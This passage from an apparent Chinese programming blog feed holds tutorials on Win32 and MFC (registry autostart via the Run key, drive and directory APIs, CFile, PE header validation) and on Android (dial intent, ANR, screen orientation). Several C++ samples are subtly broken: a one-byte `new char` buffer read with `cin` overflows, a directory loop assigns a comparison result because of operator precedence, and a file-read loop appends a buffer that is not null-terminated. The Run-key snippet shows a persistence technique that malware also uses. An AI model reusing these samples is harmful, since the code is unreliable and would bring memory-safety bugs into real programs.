<li>上述两个参数如果都是NULL的话呢，我们的类型将会返回给我们</li>
</ol>
<p>删除键值：<code>RegDeleteValue</code>，函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegDeleteValue</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey,            <span class="comment">// handle to key</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpValueName   <span class="comment">// address of value name</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这个函数也是比较的简单，参数也是很明显的。</p>
<h1 id="注册表实例-开机自动启动"><a href="#注册表实例-开机自动启动" class="headerlink" title="注册表实例-开机自动启动"></a>注册表实例-开机自动启动</h1><p>其实这类的东西做时间长了发现其实就是一个思路，就是写写注册表，基本上靠平常日无聊时候看看网站收集到的。<br><em>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</em>这个注册表里面的东西就是开机自动启动项目，但是前提你的这个值类型为：REG_SZ。<br>示例代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hRoot = HKEY_LOCAL_MACHINE; </span><br><span class="line">	<span class="keyword">char</span> *szSubKey = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;<span class="comment">//不要忘记转义了哦</span></span><br><span class="line">	HKEY hKey;</span><br><span class="line">	<span class="comment">//打开指定的子键</span></span><br><span class="line">	DWORD dwDis = REG_OPENED_EXISTING_KEY;<span class="comment">//没有的话呢也不创建</span></span><br><span class="line">	<span class="keyword">if</span>(RegCreateKeyEx(hRoot,szSubKey,<span class="number">0</span>,<span class="literal">NULL</span>,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,<span class="literal">NULL</span>,&amp;hKey,&amp;dwDis) != ERROR_SUCCESS)<span class="comment">//重启不丢失，然后多要点权限 ，不成功就返回 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">char</span> szModleFile[MAX_PATH];</span><br><span class="line">	GetModuleFileName(<span class="literal">NULL</span>,szModleFile,MAX_PATH);<span class="comment">//获取一下当前的文件名称</span></span><br><span class="line">	<span class="keyword">if</span>(RegSetValueEx(hKey,<span class="string">"Ceshi"</span>,<span class="number">0</span>,REG_SZ,(BYTE*)szModleFile,<span class="built_in">strlen</span>(szModleFile)) == ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"success!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"fail!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	RegCloseKey(hKey);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有一点需要注意的是，我们在Win8或Win10之类的高版本平台上运行，我们需要给他管理员哦，否则也是不行的！</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>驱动器卷标-文件夹操作</title>
    <url>/2020/01/28/%E9%A9%B1%E5%8A%A8%E5%99%A8%E5%8D%B7%E6%A0%87-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="驱动器与文件夹"><a href="#驱动器与文件夹" class="headerlink" title="驱动器与文件夹"></a>驱动器与文件夹</h1><p>这两个东西在我们的日常操作电脑的过程中，经常用到，就是用来存储硬盘上的文件的。</p>
<h2 id="卷标操作"><a href="#卷标操作" class="headerlink" title="卷标操作"></a>卷标操作</h2><p>由于不是很常用这些函数，我就贴一下函数定义就好了。<br><code>SetVolumeLabel</code>设置卷标名称。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetVolumeLabel</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpRootPathName,  <span class="comment">// pointer to name of root directory for </span></span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="comment">// volume</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpVolumeName   <span class="comment">// name for the volume</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>第一个参数如果为NULL的话呢是操作当前的一个卷标，第二个参数就是卷标的名称，<strong>如果设置为NULL则是删除卷标</strong>。<br><code>GetVolumeInformation</code>获取卷标信息</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetVolumeInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpRootPathName,        <span class="comment">// address of root directory of the </span></span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="comment">// file system</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpVolumeNameBuffer,     <span class="comment">// address of name of the volume</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nVolumeNameSize,         <span class="comment">// length of lpVolumeNameBuffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpVolumeSerialNumber,  <span class="comment">// address of volume serial number</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpMaximumComponentLength,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="comment">// address of system's maximum </span></span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="comment">// filename length</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpFileSystemFlags,     <span class="comment">// address of file system flags</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpFileSystemNameBuffer, <span class="comment">// address of name of file system</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nFileSystemNameSize      <span class="comment">// length of lpFileSystemNameBuffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>逻辑驱动器的序列号是在格式化驱动器的时候，操作系统随机分配的一个GUID（全局标识符）。</p>
<h2 id="检测逻辑驱动器"><a href="#检测逻辑驱动器" class="headerlink" title="检测逻辑驱动器"></a>检测逻辑驱动器</h2><p><code>DWORD GetLogicalDrives(VOID)</code>逻辑驱动器可用情况<br>这个函数没有参数，返回值是一个位掩码：<br><strong>如果函数成功，则返回一个位掩码，表示当前可用的磁盘驱动器。位位置0(最小有效位)是驱动器A，位位置1是驱动器B，位位置2是驱动器C，依此类推。</strong><br><code>GetLogicalDriveStrings</code>获取存在的卷标：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetLogicalDriveStrings</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nBufferLength,  <span class="comment">// size of buffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpBuffer       <span class="comment">// pointer to buffer for drive strings</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这个就是位了我们的方便进行设计的，缓冲区的内容格式就是：<br><code>c:\&lt;null&gt;d:\&lt;null&gt;&lt;null&gt;</code><br><code>GetDriveType</code>获取驱动器的类型<br>就是判断驱动器是个什么盘符，比如说网络的，U盘，硬盘之类的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">GetDriveType</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpRootPathName   <span class="comment">// pointer to root path</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>返回值有如下几个：</p>
<ul>
<li>DRIVE_UNKNOWN     The drive type cannot be determined. </li>
<li>DRIVE_NO_ROOT_DIR The     root directory does not exist. </li>
<li>DRIVE_REMOVABLE     The disk can be removed from the drive. </li>
<li>DRIVE_FIXED     The disk cannot be removed from the drive. </li>
<li>DRIVE_REMOTE     The drive is a remote (network) drive. </li>
<li>DRIVE_CDROM     The drive is a CD-ROM drive. </li>
<li>DRIVE_RAMDISK     The drive is a RAM disk. </li>
</ul>
<p><code>GetDiskFreeSpace</code>获取磁盘空间剩余的内容<br>有时候我们确实有这种需求，需要我们的磁盘剩余空间</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetDiskFreeSpace</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpRootPathName,    <span class="comment">// pointer to root path（要检测的磁盘）</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpSectorsPerCluster,  <span class="comment">// pointer to sectors per cluster（返回簇的扇区数）</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpBytesPerSector,  <span class="comment">// pointer to bytes per sector（每扇区的字节数）</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpNumberOfFreeClusters,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="comment">// pointer to number of free clusters（用于返回未使用的簇的数量）</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpTotalNumberOfClusters </span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="comment">// pointer to total number of clusters（驱动器簇的总量）</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>总容量的公式：簇总数 X 每簇扇区数 X 每扇区的字节数<br>剩余容量的计算公式： 未使用的簇 X 每簇扇区数 X 每扇区的字节数</p>
<h2 id="格式化驱动器"><a href="#格式化驱动器" class="headerlink" title="格式化驱动器"></a>格式化驱动器</h2><p><code>SHFormatDriver</code>这个是个外壳函数，就是意思是打开一个对话框，让用户进行选择行操作，这个函数使用的情况很少，所以不介绍了。但值得一说的是需要：<code>#include &lt;shlobj.h&gt;</code>和导入shell32.dll。</p>
<h2 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h2><p><code>CreateDirectory</code>创建一个文件夹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateDirectory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpPathName,                         <span class="comment">// pointer to directory path string</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes  <span class="comment">// pointer to security descriptor</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>不能进行递归创建，我们自己写一个就好了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL CStudy_HistoryDlg::CreateDir(LPCTSTR lpszDir)</span><br><span class="line">&#123;</span><br><span class="line">	CString strDir = lpszDir;</span><br><span class="line">	<span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(pos = strDir.Find(<span class="string">"\\"</span>,pos+<span class="number">1</span>) != <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CreateDirectory(strDir.Left(pos),<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> CreateDirectory(strDir,<span class="literal">NULL</span>);;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>RemoveDirectory</code>删除目录<br>这个只能删除空目录，无法递归删除，递归删除的话呢使用我们之前写好的那个文件删除的函数就可以了。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>MFC-CFile</title>
    <url>/2020/01/28/MFC-CFile/</url>
    <content><![CDATA[<h2 id="CFile"><a href="#CFile" class="headerlink" title="CFile"></a>CFile</h2><p>MFC是出了名的方便，因为他和java一样封装了许许多多的类，方便了我们在程序编写的时候方便的进行调用。<br>这篇博客记录一下CFile类的一些使用方法，环境就是MFC的一个类库支持。<br>这个类库支持异常的一些处理：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CFile file;</span><br><span class="line">CFileException e;</span><br><span class="line"><span class="keyword">if</span> (file.Open(<span class="string">"File.txt"</span>,CFile::modeReadWrite,&amp;e))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	e.ReportError();<span class="comment">//打印一下异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然也是可以这个样子写的：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CFile file;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">	file.Open(<span class="string">"File.txt"</span>,CFile::modeReadWrite);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (CFileException* e)</span><br><span class="line">&#123;</span><br><span class="line">	e-&gt;ReportError();<span class="comment">//打印一下异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很是方便，而且是通过信息框的方式进行打印。<br>方便的不仅如此，比如说我们没有这个txt的情况下进行写入，正常情况下我们需要判断是否有这个txt，然后没有的话呢就生成然后在写入，但是CFile这个类的话呢不需要，我们只需要写就好了，例如下面：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">CFile <span class="title">file</span><span class="params">(<span class="string">"ReadMe.txt"</span>,CFile::modeCreate | CFile::modeReadWrite | CFile::modeNoTruncate)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	这个位置操作文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">file.Close();<span class="comment">//方便其他程序可以读取</span></span><br></pre></td></tr></table></figure>
<p>这里需要注意的是，我们指定了一个<code>CFile::modeNoTruncate</code>参数就是说如果我们的txt存在了，我们并不是截断他到0，而是继续写入，这个属性基本上用到Create基本上必须要用到！<br>如何进行读写呢，看下面示例代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> buffer[<span class="number">1024</span>*<span class="number">4</span>];</span><br><span class="line"><span class="function">CFile <span class="title">file</span><span class="params">(<span class="string">"ReadMe.txt"</span>,CFile::modeCreate | CFile::modeReadWrite | CFile::modeNoTruncate)</span></span>;</span><br><span class="line">DWORD dwSize = file.GetLength();</span><br><span class="line">CString Context;</span><br><span class="line"><span class="keyword">while</span>(dwSize)</span><br><span class="line">&#123;</span><br><span class="line">	UINT real = file.Read(buffer,<span class="keyword">sizeof</span>(buffer));</span><br><span class="line">	Context += buffer;</span><br><span class="line">	dwSize -= real;</span><br><span class="line">&#125;</span><br><span class="line">MessageBox(Context);</span><br><span class="line">file.Close();<span class="comment">//方便其他程序可以读取</span></span><br></pre></td></tr></table></figure>
<p>可以看到很是方便！</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Intent实现拨号</title>
    <url>/2020/01/28/Intent%E5%AE%9E%E7%8E%B0%E6%8B%A8%E5%8F%B7/</url>
    <content><![CDATA[<h2 id="实例：手机拨号"><a href="#实例：手机拨号" class="headerlink" title="实例：手机拨号"></a>实例：手机拨号</h2><p>这个东西其实就是打开一个Activity然后在打开的过程中传输我们我的手机号，思路就是获取Edittext输入的值，然后在我们是用隐式intent的传输我们的手机号给指定的Activity就可以进行实现手机拨号的功能，具体的实现代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">activity</span> <span class="keyword">extends</span> <span class="title">Activity</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> Button btn01;</span><br><span class="line">	<span class="keyword">private</span> EditText edt01;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_01);</span><br><span class="line">		edt01 = (EditText)findViewById(R.id.editText1);</span><br><span class="line">		btn01 = (Button)findViewById(R.id.button1);</span><br><span class="line">		btn01.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				String phoneNumber = edt01.getText().toString();</span><br><span class="line">				Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">				intent.setAction(<span class="string">"android.intent.action.CALL"</span>);</span><br><span class="line">				intent.addCategory(<span class="string">"android.intent.category.DEFAULT"</span>);</span><br><span class="line">				intent.setData(Uri.parse(<span class="string">"tel:"</span>+phoneNumber));</span><br><span class="line">				startActivity(intent);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里要注意手机的是拨号的Intent-filter：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">intent.setAction(<span class="string">"android.intent.action.CALL"</span>);</span><br><span class="line">intent.addCategory(<span class="string">"android.intent.category.DEFAULT"</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">"tel:"</span>+phoneNumber));</span><br></pre></td></tr></table></figure>
<p>tel协议后面要跟上我们的手机号。<br>但是这个时候并不能正常运行，因为我们没有这个权限，拨号算是手机的底层功能，所以需要特殊的一个权限，这个就是在安装的时候我们点击安装程序自动提示给我们是否允许这个功能（安装的时候都见到过），所以我们在AndroidManifest.xml中进行一个权限的请求：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CALL_PHONE"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个就是请求拨号权限，这个之后我们的程序就能够正常的拨号了！</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件判定</title>
    <url>/2020/01/27/PE%E6%96%87%E4%BB%B6%E5%88%A4%E5%AE%9A/</url>
    <content><![CDATA[<h2 id="PE文件有效性验证"><a href="#PE文件有效性验证" class="headerlink" title="PE文件有效性验证"></a>PE文件有效性验证</h2><p>之前自己写了一个自己读的PE区段的小程序（当时是模仿CE写的一个内存搜索工具），当时写的是真的按照微软给的格式（什么NT头什么DOS头乱七八糟的）一个字节一个字节找的，但是后来发现居然有一个结构体居然可以直接拿来用，哎，失算失算~</p>
<h2 id="IMAGE-DOS-HEADER和IMAGE-NT-HEADERS"><a href="#IMAGE-DOS-HEADER和IMAGE-NT-HEADERS" class="headerlink" title="IMAGE_DOS_HEADER和IMAGE_NT_HEADERS"></a><code>IMAGE_DOS_HEADER</code>和<code>IMAGE_NT_HEADERS</code></h2><p>由于我的MSDN是2001年的，所以这个我是从IDE找到的，没有注释，但是大体的结构还是能看懂的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span></span><br><span class="line">      WORD e_magic;</span><br><span class="line">      WORD e_cblp;</span><br><span class="line">      WORD e_cp;</span><br><span class="line">      WORD e_crlc;</span><br><span class="line">      WORD e_cparhdr;</span><br><span class="line">      WORD e_minalloc;</span><br><span class="line">      WORD e_maxalloc;</span><br><span class="line">      WORD e_ss;</span><br><span class="line">      WORD e_sp;</span><br><span class="line">      WORD e_csum;</span><br><span class="line">      WORD e_ip;</span><br><span class="line">      WORD e_cs;</span><br><span class="line">      WORD e_lfarlc;</span><br><span class="line">      WORD e_ovno;</span><br><span class="line">      WORD e_res[<span class="number">4</span>];</span><br><span class="line">      WORD e_oemid;</span><br><span class="line">      WORD e_oeminfo;</span><br><span class="line">      WORD e_res2[<span class="number">10</span>];</span><br><span class="line">      LONG e_lfanew;</span><br><span class="line">    &#125; IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">      DWORD Signature;</span><br><span class="line">      IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">      IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">    &#125; IMAGE_NT_HEADERS32,*PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>
<p>这个就是微软定义的一个结构，我们用这个结构就能够轻松的读取了，思路就是先打开文件，后读取文件，判断DOS头，判断NT头。<br>实现的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	IMAGE_DOS_HEADER dosHeader;</span><br><span class="line">	IMAGE_NT_HEADERS ntHeaders;</span><br><span class="line">	<span class="keyword">char</span> * text = <span class="keyword">new</span> <span class="keyword">char</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"Please Input File Address:"</span>; </span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;text;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;text&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	HANDLE hFile = CreateFile(text,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);<span class="comment">//常规的打开一个文件 </span></span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"error file!"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD dwRead;</span><br><span class="line">	ReadFile(hFile,&amp;dosHeader,<span class="keyword">sizeof</span>(dosHeader),&amp;dwRead,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(dwRead == <span class="keyword">sizeof</span>(dosHeader))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(dosHeader.e_magic == IMAGE_DOS_SIGNATURE)<span class="comment">//判断是不是MZ，就是你常见的那个</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(SetFilePointer(hFile,dosHeader.e_lfanew,<span class="literal">NULL</span>,FILE_BEGIN) != <span class="number">-1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				ReadFile(hFile,&amp;ntHeaders,<span class="keyword">sizeof</span>(ntHeaders),&amp;dwRead,<span class="literal">NULL</span>);</span><br><span class="line">				<span class="keyword">if</span>(dwRead == <span class="keyword">sizeof</span>(ntHeaders))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(ntHeaders.Signature == IMAGE_NT_SIGNATURE)<span class="comment">//判断是不是那个PE</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span>&lt;&lt;<span class="string">"Congrate!This is PE File!"</span>;</span><br><span class="line">						<span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; </span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"sorry,This is not!"</span> ;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是比较简单的，用这两个结构体，那么具体如何读取区段之后再说！</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Anr异常</title>
    <url>/2020/01/27/Android-Anr%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<h2 id="ANR异常"><a href="#ANR异常" class="headerlink" title="ANR异常"></a>ANR异常</h2><p>其实就是主线程卡死，然后无法响应，大于6秒，会出现如下的一个错误报告：<br><img src="img1.jpg" alt="ANR异常"><br>这个时候就是说我们卡死了，代码里如这个样子写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	Thread.sleep(<span class="number">60000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决办法也很简单，就是放在子线程中写耗时的操作！</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android横竖屏设置</title>
    <url>/2020/01/27/Android%E6%A8%AA%E7%AB%96%E5%B1%8F%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="横竖屏的设置"><a href="#横竖屏的设置" class="headerlink" title="横竖屏的设置"></a>横竖屏的设置</h2><p>在Android的生命周期中，如果我们横竖屏了，那么他将会默认执行销毁和重构Activity界面的一系列操作，这个样子给我们带来了很多麻烦。<br>同样的屏幕大小变换（低版本安卓不会），键盘出现都会出现这个问题，那如何解决：<br>我们在Activity设置中设置：<br><code>android:configChanges=&quot;keyboardHidden|orientation|screenSize&quot;</code><br>设置这么一条代码，就可以实现我们的效果了，这样的话呢我们将不会执行那一系列操作（相当于关程序重新打开程序的操作）了，它将会执行新的一个函数：<code>onConfigurationChanged</code>这个函数，我们只需要在这个地方写代码就好了。</p>
<h2 id="如何知道是横竖屏？"><a href="#如何知道是横竖屏？" class="headerlink" title="如何知道是横竖屏？"></a>如何知道是横竖屏？</h2><p>其实也很简单，就是判断宽和高就可以了！<br>例如如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DisplayMetrics dm = <span class="keyword">new</span> DisplayMetrics();</span><br><span class="line"></span><br><span class="line">getWindowManager().getDefaultDisplay().getMetrics(dm);</span><br><span class="line">Log.d(<span class="string">"ttt"</span>, dm.heightPixels+<span class="string">""</span>+dm.widthPixels);</span><br></pre></td></tr></table></figure>
<p>再就是判断宽和高大小就可以了！</p>
<h2 id="设置一直是横竖屏"><a href="#设置一直是横竖屏" class="headerlink" title="设置一直是横竖屏"></a>设置一直是横竖屏</h2><p>其实也很简单，在Activity配置中配置如下项：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:screenOrientation="portrait"</span><br><span class="line">android:screenOrientation="landscape"</span><br></pre></td></tr></table></figure>
<p>第一个设置竖屏，第二个设置横屏（只能设置一个！）。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>File operate2</title>
    <url>/2020/01/26/File-operate2/</url>
    <content><![CDATA[<h2 id="CopyFileEx文件拷贝"><a href="#CopyFileEx文件拷贝" class="headerlink" title="CopyFileEx文件拷贝"></a><code>CopyFileEx</code>文件拷贝</h2><p>一开始想用<code>CopyFile</code>,后来看到了这个，那就快用这个吧，还支持回调函数，看一下MSDN的一个定义：</p>
